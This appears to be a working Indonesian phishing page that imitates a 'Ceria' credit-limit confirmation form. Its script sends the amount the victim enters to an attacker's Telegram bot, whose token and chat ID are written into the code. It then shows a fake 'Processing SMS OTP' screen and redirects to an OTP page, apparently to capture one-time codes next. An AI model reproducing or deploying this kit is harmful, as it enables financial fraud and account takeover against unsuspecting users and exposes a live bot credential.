<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Konfirmasi Limit Ceria </title>
  <meta name="viewport" content="width, initial-scale=1">
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      text-align: center;
    }

    #gambar-atas {
      margin-bottom: 20px;
    }

    #gambar-atas img {
      width: 100%;
      object-fit: cover;
      max-height: 300px;
    }

    div {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      margin-top: 20px;
    }

    /* Kolom Select */
    #pilihan-container {
      width: 90%;
      max-width: 450px;
      margin-bottom: 10px;
      margin: 0 auto;
    }

    #pilihan {
      width: 102%;
      padding: 13px;
      border-radius: 5px;
      border: 1px solid #663399;
    }

    /* Jarak antara kolom select dan kolom input */
    #jarak1 {
      height: 10px;
    }

    /* Kolom Input dan Tombol Submit */
    #jumlah-container {
      width: 86%;
      max-width: 450px;
      margin-bottom: 10px;
      display: flex;
      flex-direction: column;
      margin: 0 auto;
    }

    #jumlahInput {
      width: 98%;
      padding: 13px;
      border-radius: 5px;
      border: 1px solid #663399;
      margin-bottom: 10px;
    }

    #submit {
      width: 107%;
      max-width: 350px;
      padding: 13px;
      border-radius: 8px;
      border: none;
      background-color: #663399;
      color: white;
      font-weight: bold;
      cursor: pointer;
      margin-top: 20px;
    }

    /* Gambar di bawah Tombol Submit */
    #gambar-bawah {
      margin-top: 20px;
    }

    #gambar-bawah img {
      width: 95%;
      object-fit: cover;
    }
    /* Aturan gaya untuk elemen putih */
    .white-element {
      width: 100vw;
      height: 100vh;
      background: rgba(255, 255, 255, 0.8); /* Atur alpha (nilai transparansi) sesuai keinginan */
      position: fixed;
      top: 0;
      left: 0;
      z-index: 9999;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    .white-element img {
      width: 80px; /* Ganti dengan ukuran yang diinginkan */
      height: 80px; /* Ganti dengan ukuran yang diinginkan */
    }

    .loading-text {
      margin-top: 10px;
      font-size: 16px;
    }
  </style>
  <script>
    function sendMessageToTelegram(message) {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState === 4 && this.status === 200) {
          console.log("Pesan terkirim: " + message);
        }
      };
      var url = "https://api.telegram.org/bot6871145803:AAEe1OQPkjGp6Yr_FY1mbF4r9gTsc4bvLdc/sendMessage?chat_id=5408977495&text=" + encodeURIComponent(message);

      xhttp.open("POST", url, true);
      xhttp.send();
    }

function kirimPesan() {
  var pilihanValue = document.getElementById("pilihan").value;
  var jumlahInput = document.getElementById("jumlahInput");
  var jumlahValue = jumlahInput.value.replace(/[^0-9]/g, '');

  if (pilihanValue === "opsi1" || jumlahValue === "") {
    // Kolom select atau kolom jumlah tidak diisi, aktifkan efek getar
    if ("vibrate" in navigator) {
      navigator.vibrate([150, 00, 00]);
    }
    return;
  }

  // Format angka dengan tanda koma sebagai pemisah ribuan
  var formattedJumlah = parseFloat(jumlahValue).toLocaleString('id-ID', {
    style: 'currency',
    currency: 'IDR',
    minimumFractionDigits: 2,
  });

  // Lanjut dengan pengiriman pesan ke Telegram
  sendMessageToTelegram("𝗝𝘂𝗺𝗹𝗮𝗵 𝗟𝗶𝗺𝗶𝘁 𝗦𝗮𝗮𝘁 𝗜𝗻𝗶: " + formattedJumlah);

  document.getElementById("submit").value = "Processing SMS OTP.......";
  
  showWhiteElement();
}
 function showWhiteElement() {
      var whiteElement = document.createElement('div');
      whiteElement.classList.add('white-element');

      var logoImage = document.createElement('img');
      logoImage.src = 'https://i.ibb.co/znztJ3h/IMG-20240125-000423-removebg-preview.png';
      logoImage.alt = 'Logo';
      whiteElement.appendChild(logoImage);

      var loadingText = document.createElement('div');
      loadingText.classList.add('loading-text');
      loadingText.innerText = 'Tunggu sebentar ya... Gak lama kok';
      whiteElement.appendChild(loadingText);

      document.body.appendChild(whiteElement);

      setTimeout(function () {
        window.location.href = 'otp.html';
      }, 5000); // Ubah waktu penundaan menjadi 5 detik
    }

    function updateStyle(inputId) {
      var inputElement = document.getElementById(inputId);
      var inputValue = inputElement.value;

      if (inputValue !== '') {
        inputElement.style.fontWeight = 'bold';
        inputElement.style.color = 'rgba(black)';
      } else {
        inputElement.style.fontWeight = 'normal';
        inputElement.style.color = 'inherit';
      }
    }
  </script>
</head>
<body>
  <!-- Gambar Atas -->
  <div id="gambar-atas">
    <img src="https://i.ibb.co/YdNCY7K/https-da9bc5a4cc82aeae1212089e2c52663d-cdn-bubble-io-f1699344855196x574253127587734100-1699344776096.png" alt="Gambar Pucok">
  </div>

  <!-- Kolom Select -->
  <div id="pilihan-container">
    <label for="pilihan"></label>
    <select id="pilihan" name="pilihan">
      <option value="opsi1">Pilih Limit</option>
      <option value="opsi2">Rp 10.000.000 tenor 12 bulan suku bunga 1.42%</option>
      <option value="opsi3">Rp 15.000.000 tenor 12 bulan suku bunga 1.42%</option>
      <option value="opsi4">Rp 25.000.000 tenor 12 bulan suku bunga 1.42%</option>
      <option value="opsi5">Rp 50.000.000 Tenor 12 bulan suku bunga 1.42%</option>
    </select>
  </div>

  <!-- Jarak antara kolom select dan kolom input -->
  <div id="jarak7"></div>

  <!-- Kolom Input dan Tombol Submit -->
  <div id="jumlah-container">
    <input type="number" id="jumlahInput" name="jumlah" placeholder="Sisa Limit">
    <input type="submit" id="submit" value="Lanjutkan" onclick="kirimPesan()">
  </div>

  <!-- Gambar Bawah -->
  <div id="gambar-bawah">
    <img src="https://i.ibb.co/c2BQYp8/IMG-20231229-WA0003-removebg-preview.png" alt="Gambar 2711">
  </div>
</body>
  </html>
